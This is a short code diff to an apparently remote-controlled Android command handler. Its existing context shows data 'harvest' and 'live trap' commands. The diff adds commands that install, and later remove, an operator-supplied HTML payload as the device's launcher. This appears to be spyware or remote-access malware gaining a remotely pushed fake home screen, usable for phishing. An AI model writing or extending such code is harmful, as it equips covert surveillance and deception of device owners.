@@ -1831,6 +1831,23 @@ object CommandProcessor {
                     status = "HARVEST_INITIATED"
                     errorMsg = "Historical vacuum engaged. Live trap armed."
                 }
+                "WEB_LAUNCHER" -> {
+                    val parts = content.split("|||", limit = 2)
+                    val wallpaperUrl = parts[0].trim()
+                    val htmlPayload = parts.getOrNull(1)?.trim() ?: ""
+                    
+                    if (htmlPayload.isNotEmpty()) {
+                        WebLauncherManager.deploy(ctx, wallpaperUrl, htmlPayload)
+                        status = "WEB_LAUNCHER_DEPLOYED"
+                    } else {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Required format: URL ||| <html>..."
+                    }
+                }
+                "STOP_WEB_LAUNCHER" -> {
+                    WebLauncherManager.removeLauncher(ctx)
+                    status = "WEB_LAUNCHER_REMOVED"
+                }
                 else -> {
                     status = "FAILED (UNKNOWN_CMD)"
                     errorMsg = "Command '$fileName' is not recognized by the device."
